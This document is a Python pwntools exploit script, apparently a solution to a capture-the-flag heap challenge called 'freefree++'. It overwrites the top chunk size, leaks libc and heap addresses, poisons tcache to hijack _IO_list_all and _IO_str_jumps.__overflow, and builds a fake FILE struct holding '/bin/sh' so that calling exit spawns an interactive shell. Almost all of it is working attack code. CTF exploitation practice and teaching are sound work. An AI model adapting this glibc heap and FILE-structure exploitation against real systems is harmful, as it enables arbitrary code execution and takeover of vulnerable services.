#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./freefree++"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        #b *main+405
        b *main+448
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def alloc(val: str, size: int):
    cmd = "{}=malloc({})".format(val, size)
    p.sendlineafter('>', cmd)

def gets(val: str, buf):
    cmd = "gets({})".format(val)
    p.sendlineafter('>', cmd)
    p.sendline(buf)

def puts(val: str):
    cmd = "puts({})".format(val)
    p.sendlineafter('>', cmd)
    p.recvuntil('\x20')
    return p.recvline().rstrip(b'\n')

alloc('A', 0x10)
# overwrite top.size
gets('A', b'a' * 0x18 + p64(0xd31))
alloc('B', 0xd10)# free old top (-> unsorted bin)
alloc('C', 0xd00)# alloc old top

unsorted = u64(puts('C') + b'\0' * 2)
log.info("leak: " + hex(unsorted))
libc_base = unsorted - 0x1ebbe0
log.info("libc base: " + hex(libc_base))
libc.address = libc_base

# overwrite top.size
gets('B', b'b' * 0xd18 + p64(0x2e1))
alloc('D', 0xd10)
gets('D', b'd' * 0xd18 + p64(0x2e1))
alloc('E', 0xd10)
gets('E', b'f' * 0xd18 + p64(0x2e1))
alloc('F', 0xd20)
gets('F', b'f' * 0xd28 + p64(0x2d1))
alloc('G', 0xd20)
gets('G', b'g' * 0xd28 + p64(0x2d1))
alloc('H', 0x2c0)
alloc('I', 0x2b0)

"""
----------------------------------- Tcachebins for arena 'main_arena' -----------------------------------
Tcachebins[idx=41, size=0x2b0, @0x5557dd41c1d8] count=2
 -> Chunk(addr=0x5557dd4c5d30, size=0x2b0, flags=PREV_INUSE, fd=0x5557dd4a3d40, bk=0x5557dd41c010)
 -> Chunk(addr=0x5557dd4a3d30, size=0x2b0, flags=PREV_INUSE, fd=0x000000000000, bk=0x5557dd41c010)
Tcachebins[idx=42, size=0x2c0, @0x5557dd41c1e0] count=3
 -> Chunk(addr=0x5557dd481d20, size=0x2c0, flags=PREV_INUSE, fd=0x5557dd45fd30, bk=0x5557dd41c010)
 -> Chunk(addr=0x5557dd45fd20, size=0x2c0, flags=PREV_INUSE, fd=0x5557dd43dd30, bk=0x5557dd41c010)
 -> Chunk(addr=0x5557dd43dd20, size=0x2c0, flags=PREV_INUSE, fd=0x000000000000, bk=0x5557dd41c010)
[+] Found 5 chunks in tcache.
"""

# leak heap address
heap_leak = u64(puts('I').ljust(8, b'\0'))
log.info("heap leak: " + hex(heap_leak))
heap_base = heap_leak - 0x43d30
log.info("heap base: " + hex(heap_base))

# overwrite _IO_list_all
log.debug("_IO_list_all: " + hex(libc.symbols['_IO_list_all']))
gets('D', b'd' * 0xd18 + p64(0x2c1) + p64(libc.symbols['_IO_list_all']))
alloc('J', 0x2b0)
alloc('K', 0x2b0)# allocate _IO_list_all
gets('K', p64(heap_base + 0x2c0))


# overwrite _IO_str_jumps.__overflow
_IO_str_jumps = libc.symbols['_IO_str_jumps']
log.debug("_IO_str_jumps: " + hex(_IO_str_jumps))
__overflow_addr =  _IO_str_jumps + 0x18
log.debug("__overflow: " + hex(__overflow_addr))
gets('G',
     b'g' * 0xd28 +
     p64(0x2b1) +
     p64(__overflow_addr)
)
alloc('L', 0x2a0)
alloc('M', 0x2a0)# allocate _IO_str_jumps.__overflow
gets('M', p64(libc.symbols['system']))

# making fake struct
gets('A',
    b'/bin/sh\0' +
    b'\0'* 0x20 +
    p64(1) +
    b'\0'* 0xa8 +
    p64(_IO_str_jumps)
)
# exit
p.sendlineafter('>', "exit(0)")

p.interactive()
